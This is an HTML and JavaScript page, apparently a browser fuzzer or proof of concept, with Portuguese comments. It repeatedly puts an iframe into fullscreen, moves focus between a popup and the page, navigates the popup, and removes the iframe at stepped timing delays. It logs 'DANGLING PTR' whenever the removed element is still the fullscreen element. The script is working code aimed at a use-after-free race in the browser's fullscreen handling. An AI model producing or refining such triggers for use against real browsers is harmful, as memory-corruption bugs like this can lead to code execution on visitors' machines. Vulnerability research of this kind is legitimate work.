<html>
<body>
<button id="run">Abrir Popup e Iniciar</button>
<button id="stop">Stop</button>
<div id="status">Ready</div>
<div id="log" style="font-family:monospace;font-size:11px;
     height:250px;overflow-y:auto;border:1px solid #ccc;padding:4px"></div>
<script>
/*
  V4 FINAL:
  - Popup aberto UMA vez via gesto do usuário
  - A cada iteração: popup.location = 'about:blank' simula
    o blur/focus sem precisar de novo window.open()
  - iframe.remove() via setInterval + popup.closed preserva
    a estrutura exata do teste original
*/

var running   = false;
var popup     = null;
var iteration = 0;
var delay1    = 0;    // varia 0 → 600ms
var delay2    = 300;

function log(msg) {
    var div  = document.getElementById("log");
    var line = document.createElement("div");
    line.textContent = "[i=" + iteration + " d=" + delay1 + "ms] " + msg;
    div.appendChild(line);
    div.scrollTop = div.scrollHeight;
}

function runIteration() {
    if (!running) return;
    if (!popup || popup.closed) {
        document.getElementById("status").innerHTML = "Popup fechou — parado";
        running = false;
        return;
    }

    iteration++;
    document.getElementById("status").innerHTML =
        "iter=" + iteration + " delay=" + delay1 + "ms";

    var iframe = document.createElement("iframe");
    iframe.style.cssText = "width:100px;height:100px";
    document.body.appendChild(iframe);

    var focusTimer = null;
    var done = false;

    function finish(msg) {
        if (done) return;
        done = true;
        log(msg);
        if (focusTimer) { clearInterval(focusTimer); focusTimer = null; }
        if (iframe.parentNode) iframe.remove();

        if (iteration % 3 === 0)
            delay1 = delay1 >= 600 ? 0 : delay1 + 25;

        if (running) setTimeout(runIteration, 500);
    }

    document.addEventListener('webkitfullscreenchange', function onFsc() {
        document.removeEventListener('webkitfullscreenchange', onFsc);
        var el = document.webkitFullscreenElement;
        if (el) {
            try {
                finish("DANGLING PTR — tag=" + el.tagName +
                       " clientW=" + el.clientWidth);
            } catch(e) {
                finish("EXCEPTION no dangling: " + e);
            }
        }
    });

    iframe.onload = function() {
        var iDoc = iframe.contentDocument;
        iDoc.open();
        iDoc.write(
            '<!DOCTYPE html><html><body>' +
            '<div style="width:200px;height:150px;background:red"></div>' +
            '</body></html>'
        );
        iDoc.close();

        iDoc.documentElement.webkitRequestFullscreen();

        setTimeout(function() {
            if (!popup || popup.closed) { finish("popup já fechou"); return; }

            popup.focus();
            window.focus();
            try { iframe.contentWindow.focus(); } catch(e) {}

            setTimeout(function() {
                // Navega o popup para about:blank em vez de fechar
                // dispara blur/pagehide sem destruir a janela
                // para que possamos reutilizá-la na próxima iteração
                try { popup.location.href = "about:blank"; } catch(e) {}

                // setInterval idêntico ao original — aguarda navegação
                focusTimer = setInterval(function() {
                    var ready = false;
                    try {
                        // Popup pronto quando voltar a about:blank
                        ready = (popup.location.href === "about:blank" ||
                                 popup.document.readyState === "complete");
                    } catch(e) { ready = true; }

                    if (ready) {
                        clearInterval(focusTimer);
                        focusTimer = null;

                        var fsBefore =
                            document.webkitFullscreenElement ? "ACTIVE" : "null";

                        iframe.remove();

                        setTimeout(function() {
                            var fsAfter = document.webkitFullscreenElement;
                            if (fsAfter) {
                                try {
                                    finish("POST-REMOVE ACTIVE! tag=" +
                                           fsAfter.tagName + " w=" +
                                           fsAfter.clientWidth +
                                           " [pre=" + fsBefore + "]");
                                } catch(e) {
                                    finish("POST-REMOVE EX: " + e +
                                           " [pre=" + fsBefore + "]");
                                }
                            } else {
                                finish("clean [pre=" + fsBefore + "]");
                            }
                        }, 50);
                    }
                }, 20);
            }, delay2);
        }, delay1 || 50);
    };
}

document.getElementById("run").onclick = function() {
    if (running) return;

    popup = window.open("", "_blank", "width=400,height=300");
    if (!popup) {
        document.getElementById("status").innerHTML = "Popup bloqueado!";
        return;
    }
    popup.document.open();
    popup.document.write(
        '<!DOCTYPE html><html><body>' +
        '<h3>Fuzzer — mantém aberto</h3>' +
        '</body></html>'
    );
    popup.document.close();

    running   = true;
    iteration = 0;
    delay1    = 0;
    document.getElementById("log").innerHTML = "";
    runIteration();
};

document.getElementById("stop").onclick = function() {
    running = false;
    if (popup && !popup.closed) popup.close();
    document.getElementById("status").innerHTML =
        "Parado — iter=" + iteration + " último delay=" + delay1 + "ms";
};
</script>
</body>
</html>
